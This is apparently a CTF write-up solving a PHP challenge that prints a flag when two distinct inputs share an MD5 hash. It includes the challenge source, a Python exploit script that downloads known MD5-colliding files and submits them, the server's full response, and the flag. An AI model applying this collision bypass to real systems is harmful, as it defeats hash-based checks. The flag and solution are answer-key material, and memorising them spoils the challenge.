# Wildest Dreams Part 2

### Description

![](Pasted%20image%2020220312123333.png)

## Solution

```
<?php 

error_reporting(E_ERROR | E_PARSE);
include('flag.php');
?>
```

```php
<?php
	if(!empty($_GET['i1']) && !empty($_GET['i2'])){
		$i1 = $_GET['i1'];
		$i2 = $_GET['i2'];
		if($i1 === $i2){
			die("i1 and i2 can't be the same!");
		}
		$len1 = strlen($i1);
		$len2 = strlen($i2);
		if($len1 < 15){
			die("i1 is too shorttttttt pee pee pee pee pee");
		}
		if($len2 < 15){
			die("i2 is too shorttttttt pee pee pee pee pee");
		}
		if(md5($i1) == md5($i2)){
			echo $flag;
		}
		echo "<br>The more that you say, the less i know.";
	} else {
		echo "<br> You need to provide two strings, i1 and i2. /1989.php?i1=a&i2=b";
	}
	
	
?>
```

Simple case of md5 collisions (could also be php weak comparisons but screw it)

```python
import requests
import os
URL = 'http://chals.ctf.sg:40401/1989.php'

#https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html

os.system("wget https://s3-eu-west-1.amazonaws.com/md5collisions/a.php")
os.system("wget https://s3-eu-west-1.amazonaws.com/md5collisions/b.php")
def showResponse(response):
    print(response.text)
    print(response)
    print(response.headers)
    

### GET ##############################################
with open("a.php") as f:
    i1Data = f.read()
    
with open("b.php") as f:
    i2Data = f.read()

data = {"i1":i1Data, "i2":i2Data}
response = requests.get(URL, params=data) #headers=headers)
showResponse(response)

os.system("rm a.php b.php")
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python exploit.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
--2022-03-11 23:24:00--  https://s3-eu-west-1.amazonaws.com/md5collisions/a.php
Resolving s3-eu-west-1.amazonaws.com (s3-eu-west-1.amazonaws.com)... 52.218.116.64
Connecting to s3-eu-west-1.amazonaws.com (s3-eu-west-1.amazonaws.com)|52.218.116.64|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 406 [application/octet-stream]
Saving to: ‘a.php’

a.php                                     100%[=====================================================================================>]     406  --.-KB/s    in 0s      

2022-03-11 23:24:02 (10.1 MB/s) - ‘a.php’ saved [406/406]

--2022-03-11 23:24:02--  https://s3-eu-west-1.amazonaws.com/md5collisions/b.php
Resolving s3-eu-west-1.amazonaws.com (s3-eu-west-1.amazonaws.com)... 52.218.116.64
Connecting to s3-eu-west-1.amazonaws.com (s3-eu-west-1.amazonaws.com)|52.218.116.64|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 406 [application/octet-stream]
Saving to: ‘b.php’

b.php                                     100%[=====================================================================================>]     406  --.-KB/s    in 0.003s  

2022-03-11 23:24:03 (119 KB/s) - ‘b.php’ saved [406/406]

<!DOCTYPE HTML>
<!--
        Helios by HTML5 UP
        html5up.net | @ajlkn
        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
        <head>
                <title>BTBLP</title>
                <meta charset="utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
                <link rel="stylesheet" href="assets/css/main.css" />
                <noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
        </head>
        <body class="no-sidebar is-preload">
                <div id="page-wrapper">

                        <!-- Header -->
                                <div id="header">

                                        <!-- Inner -->
                                                <div class="inner">
                                                        <header>
                                                                <h1><a href="index.html" id="logo">Wildest Dreams</a></h1>
                                                        </header>
                                                </div>

                                        <!-- Nav -->
                                        <nav id="nav">
                                                <ul>
                                                        <li><a href="index.php">Home</a></li>

                                                        <li><a href="1989.php">1989</a></li>
                                                </ul>
                                        </nav>

                                </div>

                        <!-- Main -->
                                <div class="wrapper style1">

                                        <div class="container">
                                                <article id="main" class="special">
                                                        <header>
                                                                <h2><a href="#">I could be in your wildest dream.</a></h2>
                                                                <p>
                                                                        I'm like the water when your ship rolled in that night<br>
                                                                        Rough on the surface but you cut through like a knife
                                                                </p>
                                                        </header>
                                                        <a href="#" class="image featured"><img src="images/tsbg.jpg" alt="" /></a>

                                                        <iframe width="560" height="315" src="https://www.youtube.com/embed/CUr_UwUUXzU?start=126&autoplay=1" title="YouTube video player" frameborder="0" allow="autoplay" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><br>CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}<br>The more that you say, the less i know.
                                                </article>

                                        </div>

                                </div>

                        <!-- Footer -->
                                <div id="footer">
                                        <div class="container">
                                                <div class="row">

                                                        <!-- Photos -->

                                                </div>
                                                <hr />
                                                <div class="row">
                                                        <div class="col-12">

                                                                <!-- Contact -->

                                                                <!-- Copyright -->

                                                        </div>

                                                </div>
                                        </div>
                                </div>

                </div>

                <!-- Scripts -->
                        <script src="assets/js/jquery.min.js"></script>
                        <script src="assets/js/jquery.dropotron.min.js"></script>
                        <script src="assets/js/jquery.scrolly.min.js"></script>
                        <script src="assets/js/jquery.scrollex.min.js"></script>
                        <script src="assets/js/browser.min.js"></script>
                        <script src="assets/js/breakpoints.min.js"></script>
                        <script src="assets/js/util.js"></script>
                        <script src="assets/js/main.js"></script>

        </body>
</html>
<Response [200]>
{'Content-Length': '1123', 'X-Powered-By': 'PHP/7.0.33', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.25 (Debian)', 'Connection': 'Keep-Alive', 'Date': 'Sat, 12 Mar 2022 04:27:25 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Flag

`CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}`